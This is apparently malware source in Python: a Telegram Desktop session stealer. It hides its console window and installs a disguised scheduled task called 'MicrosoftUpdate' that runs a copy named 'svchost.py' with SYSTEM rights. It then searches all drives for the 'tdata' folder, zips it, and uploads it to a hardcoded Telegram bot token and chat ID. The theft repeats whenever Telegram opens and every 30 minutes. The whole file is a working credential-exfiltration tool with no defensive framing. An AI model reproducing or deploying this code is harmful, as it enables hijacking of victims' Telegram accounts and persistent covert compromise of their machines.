import os
import ctypes
import time
import json
import urllib.request
import socket
import tempfile
import zipfile
import subprocess
import sys

if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def get_tdata_bruteforce():
    pc_name = socket.gethostname()
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    if os.path.exists(tdata_path):
        return tdata_path, pc_name
    
    for drive_letter in range(ord('C'), ord('Z') + 1):
        drive = f"{chr(drive_letter)}:\\"
        if os.path.exists(drive):
            try:
                for root, dirs, files in os.walk(drive, topdown=True):
                    if os.path.basename(root).lower() == 'tdata':
                        return root, pc_name
                    if 'telegramdesktop' in root.lower():
                        possible_tdata = os.path.join(root, 'tdata')
                        if os.path.exists(possible_tdata):
                            return possible_tdata, pc_name
            except:
                pass
    return None, pc_name

def install_persistence():
    try:
        script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
        if not os.path.exists(script_path):
            content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
            with open(script_path, 'w') as f:
                f.write(content)
        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
    except:
        pass

# MAIN
install_persistence()

# Birinchi marta ishga tushganda darhol yuboradi
tdata_path, pc_name = get_tdata_bruteforce()
if tdata_path:
    try:
        temp_dir = tempfile.gettempdir()
        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                    except: pass
        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
        os.remove(zip_path)
    except:
        pass

# Endi doimiy kuzatish (faqat yopilib qayta ochilganda yoki 30 daqiqada)
last_state = "closed"
last_sent_time = 0

while True:
    time.sleep(2)  # Har 2 soniyada tekshiradi
    try:
        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
        is_running = "Telegram.exe" in result.stdout
        
        current_time = time.time()
        
        # 1. Agar Telegram hozirgina ochilgan bo'lsa (yopiq edi, ochildi)
        if is_running and last_state == "closed":
            tdata_path, pc_name = get_tdata_bruteforce()
            if tdata_path:
                try:
                    temp_dir = tempfile.gettempdir()
                    zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(current_time)}.zip")
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, dirs, files in os.walk(tdata_path):
                            for file in files:
                                try:
                                    file_path = os.path.join(root, file)
                                    zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                                except: pass
                    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
                    os.remove(zip_path)
                except:
                    pass
            last_state = "open"
            last_sent_time = current_time
        
        # 2. Agar Telegram yopilsa, holatni o'zgartiramiz (lekin tdata yubormaymiz)
        if not is_running and last_state == "open":
            last_state = "closed"
        
        # 3. Agar Telegram ochiq tursa, lekin 30 daqiqadan o'tgan bo'lsa, yangi tdata yuboradi
        if is_running and last_state == "open":
            if current_time - last_sent_time > 1800:  # 30 daqiqa = 1800 soniya
                tdata_path, pc_name = get_tdata_bruteforce()
                if tdata_path:
                    try:
                        temp_dir = tempfile.gettempdir()
                        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(current_time)}.zip")
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            for root, dirs, files in os.walk(tdata_path):
                                for file in files:
                                    try:
                                        file_path = os.path.join(root, file)
                                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                                    except: pass
                        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
                        os.remove(zip_path)
                    except:
                        pass
                last_sent_time = current_time
                
    except:
        pass
